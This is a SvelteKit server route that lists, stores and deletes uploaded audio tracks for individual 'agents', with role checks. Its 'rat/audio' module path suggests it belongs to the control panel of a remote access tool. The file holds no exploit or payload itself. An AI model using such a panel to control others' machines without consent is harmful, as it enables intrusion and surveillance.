import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { randomUUID } from 'node:crypto';
import { writeFile } from 'node:fs/promises';
import { join } from 'node:path';
import { audioBridgeManager } from '$lib/server/rat/audio';
import type { AudioUploadTrack } from '$lib/types/audio';
import { requireOperator, requireViewer } from '$lib/server/authorization';

function sanitizeFilename(input: string): string {
	return (
		input
			.replace(/[^a-zA-Z0-9_.-]+/g, '-')
			.replace(/-{2,}/g, '-')
			.replace(/^-+|-+$/g, '') || 'track'
	);
}

export const GET: RequestHandler = ({ params, locals }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	requireViewer(locals.user);

	const uploads = audioBridgeManager.listUploads(id);
	return json({ uploads });
};

export const POST: RequestHandler = async ({ params, request, locals }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	requireOperator(locals.user);

	const formData = await request.formData();
	const file = formData.get('file');
	if (!(file instanceof File)) {
		throw error(400, 'Audio file is required');
	}

	const arrayBuffer = await file.arrayBuffer();
	const buffer = Buffer.from(arrayBuffer);
	if (buffer.byteLength === 0) {
		throw error(400, 'Audio file is empty');
	}

	const directory = await audioBridgeManager.ensureUploadDirectory(id);
	const trackId = randomUUID();
	const storedName = `${trackId}-${sanitizeFilename(file.name ?? 'track')}`;
	const storedPath = join(directory, storedName);
	await writeFile(storedPath, buffer);

	audioBridgeManager.registerUpload(id, {
		id: trackId,
		agentId: id,
		storedName,
		originalName: file.name ?? 'track',
		size: buffer.byteLength,
		contentType: file.type || undefined,
		uploadedAt: new Date()
	});

	const uploads = audioBridgeManager.listUploads(id);
	const created = uploads.find((upload) => upload.id === trackId) as AudioUploadTrack;
	return json({ track: created, uploads }, { status: 201 });
};

export const DELETE: RequestHandler = async ({ params, request, locals }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	requireOperator(locals.user);

	let payload: Record<string, unknown> = {};
	try {
		payload = (await request.json()) as Record<string, unknown>;
	} catch {
		payload = {};
	}

	const trackId = typeof payload.trackId === 'string' ? payload.trackId : null;
	if (!trackId) {
		throw error(400, 'Track identifier is required');
	}

	await audioBridgeManager.removeUpload(id, trackId);
	const uploads = audioBridgeManager.listUploads(id);
	return json({ uploads });
};
